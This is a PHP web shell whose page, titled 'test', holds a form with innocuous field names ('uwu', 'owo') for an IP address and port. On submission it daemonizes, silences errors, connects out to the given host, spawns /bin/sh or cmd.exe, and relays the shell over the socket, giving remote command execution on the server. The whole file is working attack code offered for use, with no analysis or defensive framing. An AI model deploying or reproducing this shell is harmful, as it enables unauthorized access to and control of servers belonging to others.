
<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $addr = $_POST['uwu'];
    $owo = $_POST['owo'];

    if (filter_var($addr, FILTER_VALIDATE_IP) && is_numeric($owo) && $owo > 0 && $owo <= 65535) {
        class Shell {
            private $addr  = null;
            private $owo  = null;
            private $os    = null;
            private $shell = null;
            private $descriptorspec = array(
                0 => array('pipe', 'r'), 
                1 => array('pipe', 'w'), 
                2 => array('pipe', 'w') 
            );
            private $buffer = 1024; 
            private $clen   = 0; 
            private $error  = false;
            private $sdump  = true; 

            public function __construct($addr, $owo) {
                $this->addr = $addr;
                $this->port = $owo;
            }

            private function detect() {
                $detected = true;
                $os = PHP_OS;
                if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
                    $this->os    = 'LINUX';
                    $this->shell = '/bin/sh';
                } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
                    $this->os    = 'WINDOWS';
                    $this->shell = 'cmd.exe';
                } else {
                    $detected = false;
                    echo "os not supported";
                }
                return $detected;
            }

            private function daemonize() {
                $exit = false;
                if (!function_exists('pcntl_fork')) {
                    echo "";
                } else if (($pid = @pcntl_fork()) < 0) {
                    echo "";
                } else if ($pid > 0) {
                    $exit = true;
                    echo "";
                } else if (posix_setsid() < 0) {
                    echo "";
                } else {
                    echo "completed!\n";
                }
                return $exit;
            }

            private function settings() {
                @error_reporting(0);
                @set_time_limit(0); 
                @umask(0); 
            }

            private function dump($data) {
                if ($this->sdump) {
                    $data = str_replace('<', '&lt;', $data);
                    $data = str_replace('>', '&gt;', $data);
                    echo $data;
                }
            }

            private function read($stream, $name, $buffer) {
                if (($data = @fread($stream, $buffer)) === false) {
                    $this->error = true;
                    echo "error r!!";
                }
                return $data;
            }

            private function write($stream, $name, $data) {
                if (($bytes = @fwrite($stream, $data)) === false) {
                    $this->error = true;
                    echo "error w!!";
                }
                return $bytes;
            }

            private function rw($input, $output, $iname, $oname) {
                while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
                    if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
                    $this->dump($data);
                }
            }

            private function brw($input, $output, $iname, $oname) {
                $size = fstat($input)['size'];
                if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
                    while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                        $this->clen -= $bytes;
                        $size -= $bytes;
                    }
                }
                while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
                    $size -= $bytes;
                    $this->dump($data);
                }
            }

            public function run() {
                if ($this->detect() && !$this->daemonize()) {
                    $this->settings();
                    $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
                    if (!$socket) {
                        echo "SOC_ERROR: {$errno}: {$errstr}\n";
                    } else {
                        stream_set_blocking($socket, false);
                        $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                        if (!$process) {
                            echo "PROC_ERROR: Cannot start the shell\n";
                        } else {
                            foreach ($pipes as $pipe) {
                                stream_set_blocking($pipe, false);
                            }
                            $status = proc_get_status($process);
                            @fwrite($socket, "PID: {$status['pid']}\n");
                            do {
                                $status = proc_get_status($process);
                                if (feof($socket)) {
                                    echo "terminated\n"; break;
                                } else if (feof($pipes[1]) || !$status['running']) {
                                    echo "terminated\n"; break;
                                }
                                $streams = array(
                                    'read'   => array($socket, $pipes[1], $pipes[2]),
                                    'write'  => null,
                                    'except' => null
                                );
                                $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);
                                if ($num_changed_streams === false) {
                                    echo "failed\n"; break;
                                } else if ($num_changed_streams > 0) {
                                    if ($this->os === 'LINUX') {
                                        if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                        if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                        if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                                    } else if ($this->os === 'WINDOWS') {
                                        if (in_array($socket, $streams['read'])) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                                        if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                                        if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                                    }
                                }
                            } while (!$this->error);

                            foreach ($pipes as $pipe) {
                                fclose($pipe);
                            }
                            proc_close($process);
                        }
                        fclose($socket);
                    }
                }
            }
        }

        echo '<pre>';
        $sh = new Shell($addr, $owo);
        $sh->run();
        unset($sh);
        echo '</pre>';
    } else {
        echo "error.";
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test</title>
</head>
<body>
    <form action="test2.php" method="POST">
        <label for="uwu">uwu</label>
        <input type="text" id="uwu" name="uwu" required><br><br>
        <label for="owo">owo</label>
        <input type="text" id="owo" name="owo" required><br><br>
        <input type="submit" value="Conectar">
    </form>
</body>
</html>